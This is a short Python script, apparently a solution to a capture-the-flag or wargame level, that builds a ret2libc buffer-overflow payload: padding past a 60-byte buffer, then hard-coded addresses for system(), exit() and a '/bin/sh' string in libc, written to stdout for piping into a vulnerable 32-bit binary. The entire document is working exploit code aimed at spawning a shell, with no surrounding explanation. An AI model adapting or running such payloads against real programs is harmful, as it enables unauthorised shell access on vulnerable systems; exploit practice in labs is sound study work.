import sys
import struct


def ret2libc() -> bytes:
    padding = b'AAAA'*15
    padding += struct.pack('I', 0x00000000) # buffer size is 60
    padding += b'AAAA'*4

    ret = struct.pack('I', 0x08048544) # return to itself
    next_ret = struct.pack('I', 0xb7ecffb0) # return to system() at (0xb7e97000 + 0x00038fb0)
    return_after_system = struct.pack('I', 0xb7ec60c0) # exit() at 0xb7ec60c0
    bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

    return (padding + ret + next_ret + return_after_system + bin_sh)


exploit = ret2libc()
sys.stdout.buffer.write(exploit)
sys.stdout.flush()
